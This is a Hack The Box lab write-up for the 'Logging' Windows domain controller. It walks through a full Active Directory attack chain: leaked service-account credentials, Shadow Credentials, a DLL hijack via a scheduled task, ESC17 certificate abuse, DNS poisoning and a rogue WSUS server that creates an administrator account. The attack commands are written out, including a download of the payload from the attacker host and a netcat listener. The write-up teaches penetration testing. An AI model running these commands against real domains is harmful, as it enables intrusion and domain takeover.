# Machine: Logging

Date: 11-06-2026
Platform: Hack The Box
Difficulty: Medium
Author: atrix187

---

## Recon

### Nmap:

```bash
nmap -sC -sV -oN scans/nmap_initial.txt $MACHINE_IP
```

**Full port scan:**

```bash
nmap -p- --min-rate 5000 -sV -oN scans/nmap_full.txt $MACHINE_IP
```

**Results:**

- 53 → DNS — standard Active Directory DNS
- 88 → Kerberos — KDC
- 135/139/445 → RPC/SMB — initial foothold
- 389/636/3268/3269 → LDAP/LDAPS/Global Catalog — Active Directory
- 5985 → WinRM — remote management
- 8530/8531 → WSUS HTTP/HTTPS — critical to the root path

**Notes:**

- The target is a Windows Server 2019 Domain Controller.
- Hostname: `dc01.logging.htb`
- Domain: `logging.htb`
- WSUS ports `8530/8531` were not visible in the default top-1000 scan and were only found with a full `-p-` scan.
- The lab VM clock was approximately 7 hours ahead of the DC. VirtualBox Guest Additions repeatedly reverted the clock, breaking Kerberos.
- Added to `/etc/hosts`:

```bash
echo "10.129.x.x dc01.logging.htb logging.htb dc01" | sudo tee -a /etc/hosts
```

### Kerberos clock synchronization:

Before every Kerberos operation:

```bash
sudo pkill -9 VBoxService
sudo rdate -n <DC_IP>
date -u
```

The clock issue caused errors such as `KRB_AP_ERR_SKEW`, expired tickets, and WinRM GSSAPI failures.

---

## Enumeration

### SMB enumeration:

Starting credentials:

```text
wallace.everette : Welcome2026@
```

```bash
netexec smb $MACHINE_IP -u wallace.everette -p 'Welcome2026@' --shares
```

A non-default readable share named `Logs` was discovered.

```bash
smbclient //$MACHINE_IP/Logs -U 'logging.htb\wallace.everette%Welcome2026@'
```

```text
smb: \> get IdentitySync_Trace_20260219.log
```

**Findings:**

- `Logs` was readable with the supplied credentials.
- `IdentitySync_Trace_20260219.log` contained a verbose LDAP `ConnectionContext` dump.
- The log exposed a service-account username and an old password.

### Credential discovery:

The log contained:

```text
[2026-02-19 03:14:22] ConnectionContext initialized
[2026-02-19 03:14:22]   BindUser: LOGGING\svc_recovery
[2026-02-19 03:14:22]   BindPass: Em3rg3ncyPa$$2025
[2026-02-19 03:14:22]   Server:   dc01.logging.htb:389
```

The password was rotated from `2025` to `2026`.

Authentication errors were useful:

| Attempt | Error | Meaning |
| --- | --- | --- |
| NTLM with `...2025` | `NT_STATUS_ACCOUNT_RESTRICTION` | NTLM was blocked by Protected Users |
| Kerberos TGT with `...2025` | `KDC_ERR_PREAUTH_FAILED` | Password was wrong |
| Kerberos TGT with `...2026` | `KRB_AP_ERR_SKEW` | Password was correct; clock was wrong |
| Kerberos after clock fix | `SUCCESS` | Valid TGT obtained |

**Real credential:**

```text
svc_recovery : Em3rg3ncyPa$$2026
```

### Protected Users:

`svc_recovery` was a member of `Protected Users`.

This explains the authentication behavior:

- NTLM authentication is disabled.
- RC4 is disabled for Kerberos.
- Credential caching is disabled.
- Kerberos TGT lifetime is restricted.
- The account therefore needs Kerberos authentication rather than NTLM.

```bash
sudo rdate -n <DC_IP>
impacket-getTGT -dc-ip <DC_IP> logging.htb/svc_recovery:'Em3rg3ncyPa$$2026'
export KRB5CCNAME=svc_recovery.ccache
```

### Active Directory ACL enumeration:

`svc_recovery` had `GenericWrite` over the Managed Service Account:

```text
msa_health$
```

`msa_health$` was a member of `Remote Management Users` and was not in `Protected Users`, making it a useful pivot account.

---

## Exploitation

### Shadow Credentials — GenericWrite over `msa_health$`

`GenericWrite` allowed modification of the target account's `msDS-KeyCredentialLink` attribute.

The Shadow Credentials attack works by:

1. Writing a key credential to `msDS-KeyCredentialLink`.
2. Authenticating with the generated certificate through PKINIT.
3. Obtaining a TGT.
4. Recovering the target account's NT hash using the PAC.

`pywhisker` was problematic because `svc_recovery` is in `Protected Users` and therefore requires Kerberos authentication. Certipy worked.

```bash
certipy-ad shadow auto \
  -u 'svc_recovery@logging.htb' -k -no-pass \
  -account 'msa_health$' \
  -dc-ip <DC_IP> -dc-host dc01.logging.htb \
  -target dc01.logging.htb -ns <DC_IP>
```

**Result:**

```text
NT hash for msa_health$:
603fc24ee01a9409f83c9d1d701485c5
```

A Kerberos cache for `msa_health$` was also obtained.

```bash
export KRB5CCNAME=msa_health.ccache
```

### WinRM shell as `msa_health$`:

```bash
evil-winrm -i dc01.logging.htb -r logging.htb
```

**Result:**

```powershell
*Evil-WinRM* PS C:\Users\msa_health$\Documents> whoami
logging\msa_health$
```

---

### DLL Hijack — UpdateMonitor scheduled task

#### Scheduled task enumeration:

Normal `schtasks`/CIM enumeration was access-denied, so the Windows `Schedule.Service` COM object was used.

```powershell
$svc = New-Object -ComObject Schedule.Service
$svc.Connect()
$folder = $svc.GetFolder('\')
$task = $folder.GetTask('UpdateChecker Agent')
$task.Definition.Actions | Select-Object Path, Arguments
$task.Definition.Principals | Select-Object UserId
```

**Findings:**

- Binary: `C:\Program Files\UpdateMonitor\UpdateMonitor.exe`
- Runs as: `logging\jaylee.clifton`
- Trigger: every 3 minutes
- The binary is a custom .NET application.

#### Application analysis:

The decompiled logic showed:

```text
C:\ProgramData\UpdateMonitor\Settings_Update.zip
        |
        v
ExtractToDirectory()
        |
        v
C:\Program Files\UpdateMonitor\bin\
        |
        v
LoadLibrary("settings_update.dll")
        |
        v
GetProcAddress("PreUpdateCheck")
        |
        v
Execute DLL as jaylee.clifton
```

The directory was writable by `BUILTIN\Users`:

```powershell
icacls C:\ProgramData\UpdateMonitor
```

Relevant permissions included write/append access.

Because `msa_health$` was in `BUILTIN\Users`, the account could control the ZIP contents and therefore control `settings_update.dll`.

**Result:** arbitrary native code execution as `jaylee.clifton`.

#### Building the payload:

The host process was 32-bit, so the DLL had to be compiled as PE32/i386.

Two load errors were encountered:

- Error `126` → missing MinGW runtime dependencies → static-link the DLL.
- Error `193` → architecture mismatch → compile a 32-bit DLL.

Example build:

```bash
i686-w64-mingw32-gcc -shared -o settings_update.dll payload.c \
  -static -static-libgcc -Wl,--exclude-all-symbols
```

Verify the resulting architecture and dependencies:

```bash
file settings_update.dll
i686-w64-mingw32-objdump -x settings_update.dll | grep -i "DLL Name"
```

The final payload exported `PreUpdateCheck` and executed when the scheduled task loaded the DLL.

#### Delivery:

`evil-winrm` can mangle backslash paths when uploading, so the target downloaded the ZIP over HTTP instead.

```bash
zip Settings_Update.zip settings_update.dll
python3 -m http.server 8080
nc -lvnp 4444
```

From the target:

```powershell
Invoke-WebRequest -Uri 'http://KALI_IP:8080/Settings_Update.zip' `
  -OutFile 'C:\ProgramData\UpdateMonitor\Settings_Update.zip'
```

The scheduled task executed within approximately 3 minutes.

**Result:** shell/code execution as:

```text
logging\jaylee.clifton
```

The user flag was obtained from:

```text
C:\Users\jaylee.clifton\Desktop\user.txt
```

#### Failed S4U detour:

An S4U2self/S4U2proxy route from `msa_health$` to impersonate `jaylee` was attempted based on a forum hint.

It failed with:

```text
KDC_ERR_BADOPTION
```

The reason was that `msa_health$` did not have constrained delegation rights. The DLL hijack was the successful path.

---

### ESC17 + DNS Poisoning + Rogue WSUS

The WSUS deserialization CVE path was investigated, but `CVE-2025-59287` was patched on the box. The successful root path instead chained:

1. ESC17 certificate abuse.
2. DNS record modification.
3. A rogue WSUS server.

#### WSUS configuration:

From the `jaylee` shell:

```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUStatusServer
```

Both pointed to:

```text
https://wsus.logging.htb:8531
```

#### Obtain jaylee's TGT:

Rubeus `tgtdeleg` was used to obtain a usable Kerberos ticket.

```cmd
C:\ProgramData\UpdateMonitor\Rubeus.exe tgtdeleg /nowrap
```

On Kali, convert the ticket:

```bash
echo "<BASE64_BLOB>" | base64 -d > jaylee.kirbi
impacket-ticketConverter jaylee.kirbi jaylee.ccache
export KRB5CCNAME=~/Desktop/Logging/jaylee.ccache
```

#### ESC17 certificate enrollment:

The `UpdateSrv` certificate template allowed members of the `IT` group to enroll.

Important template properties:

- Enrollment rights: `LOGGING.HTB\IT`
- `EnrolleeSuppliesSubject`: `True`
- EKU: `Server Authentication`

This allowed `jaylee` to request a CA-trusted TLS certificate whose SAN was:

```text
wsus.logging.htb
```

Request the certificate:

```bash
certipy-ad req \
  -u 'jaylee.clifton@logging.htb' -k -no-pass \
  -dc-ip <DC_IP> -dc-host dc01.logging.htb \
  -target dc01.logging.htb \
  -ca 'logging-DC01-CA' \
  -template UpdateSrv \
  -dns 'wsus.logging.htb'
```

**Result:**

```text
wsus.pfx
```

The certificate was trusted by the DC for TLS connections to the WSUS hostname.

#### DNS poisoning:

`jaylee` had `SeMachineAccountPrivilege`. In this environment, authenticated users with this privilege could write AD-integrated DNS records.

```bash
bloodyad --host dc01.logging.htb -d logging.htb \
  -k ccache=./jaylee.ccache \
  add dnsRecord wsus KALI_IP
```

Verify:

```bash
nslookup wsus.logging.htb <DC_IP>
```

Expected result:

```text
wsus.logging.htb -> KALI_IP
```

#### Rogue WSUS setup:

Extract the certificate and key:

```bash
openssl pkcs12 -in wsus.pfx -clcerts -nokeys -out wsus.crt -passin pass:
openssl pkcs12 -in wsus.pfx -nocerts -nodes -out wsus.key -passin pass:
```

Configure `stunnel` to terminate HTTPS on port 8531 and forward to the WSUS backend:

```ini
[wsus]
accept = KALI_IP:8531
connect = 127.0.0.1:8530
cert = /path/to/wsus.crt
key = /path/to/wsus.key
```

Start it:

```bash
sudo stunnel /tmp/stunnel-wsus.conf
```

The rogue WSUS backend used `pywsus`.

```bash
wget https://live.sysinternals.com/PsExec64.exe
```

```bash
python3 pywsus/pywsus.py \
  -H 127.0.0.1 -p 8530 \
  -e PsExec64.exe \
  -c '/accepteula /s cmd.exe /c "net user hacker Password123! /add && net localgroup administrators hacker /add"' \
  -v
```

#### Trigger Windows Update:

From the WinRM shell:

```cmd
wuauclt /detectnow
wuauclt /updatenow
```

The rogue WSUS server received the DC's requests and delivered the malicious update payload.

The observed sequence included:

```text
GetConfig
GetCookie
RegisterComputer
SyncUpdates -> PsExec64.exe
GetExtendedUpdateInfo
FileDownload -> PsExec64.exe
```

**Result:** SYSTEM-level execution created the account:

```text
hacker : Password123!
```

and added it to the local Administrators group.

---

## Privilege Escalation

### Final SYSTEM-to-Administrator access:

Connect using the account created by the rogue WSUS execution:

```bash
evil-winrm -i dc01.logging.htb -u hacker -p 'Password123!'
```

Verify:

```powershell
whoami
whoami /groups | findstr Admin
```

Expected:

```text
logging\hacker
BUILTIN\Administrators
```

**Successful escalation:** root

---

## Loot / Flags

- **user.txt:** captured from `C:\Users\jaylee.clifton\Desktop\user.txt`
- **root.txt:** `C:\Users\Administrator\Desktop\root.txt`

### Credential summary:

| Account | Credential | Source / Notes |
| --- | --- | --- |
| `wallace.everette` | `Welcome2026@` | Given starting credentials |
| `svc_recovery` | `Em3rg3ncyPa$$2026` | Leaked in SMB log; rotated from 2025 |
| `msa_health$` | NT hash `603fc24ee01a9409f83c9d1d701485c5` | Shadow Credentials |
| `jaylee.clifton` | N/A | Code execution through DLL hijack; IT group member |
| `hacker` | `Password123!` | Created through rogue WSUS SYSTEM execution |

---

## Lessons Learned

- **Clock synchronization matters for Kerberos.** The VM was approximately 7 hours ahead of the DC because VirtualBox Guest Additions kept reverting the clock. Kill `VBoxService` and synchronize with the DC before Kerberos operations.
- **Read authentication errors as signals.** `NT_STATUS_ACCOUNT_RESTRICTION` did not mean the password was wrong. The transition from `KDC_ERR_PREAUTH_FAILED` to `KRB_AP_ERR_SKEW` revealed that the rotated password was correct.
- **Protected Users means Kerberos-only authentication.** When an account is in `Protected Users`, NTLM-based approaches fail. Pivot to an account that can authenticate normally.
- **GenericWrite can be enough for Shadow Credentials.** Control over `msDS-KeyCredentialLink` can provide a path to a target account's TGT and NT hash.
- **Scheduled tasks are worth inspecting even with limited privileges.** When `schtasks` and CIM access were denied, `Schedule.Service` provided another way to inspect the task.
- **DLL load errors are useful debugging information.** Error `126` indicated missing dependencies; error `193` indicated a 32-bit/64-bit architecture mismatch.
- **Build Windows payloads for the target architecture.** The UpdateMonitor process was 32-bit, requiring an `i686-w64-mingw32-gcc` build.
- **Be careful with file-transfer tooling.** `evil-winrm` can mangle Windows paths containing backslashes. Downloading files with `Invoke-WebRequest` from the target avoided the problem.
- **ESC17 can be useful for TLS impersonation.** The certificate only needed the Server Authentication EKU because the objective was to impersonate the WSUS HTTPS endpoint, not perform PKINIT or LDAP authentication.
- **SeMachineAccountPrivilege plus AD-integrated DNS can enable hostname redirection.** Combined with a trusted certificate for the target hostname, this provided the network-level redirection needed for the rogue WSUS attack.
- **Do not blindly trust winPEAS ACL output.** The writeup found inherited ACEs being interpreted as direct permissions. Verify important ACL findings with tools such as BloodHound, bloodyAD, or `impacket-dacledit`.
- **Do not assume an obvious CVE is the intended route.** `CVE-2025-59287` was patched. Manual enumeration exposed the working DNS + trusted certificate + rogue WSUS chain instead.
- **Always perform a full port scan on AD machines.** Ports `8530/8531` were missed by the top-1000 scan, yet they were essential to the final root path.
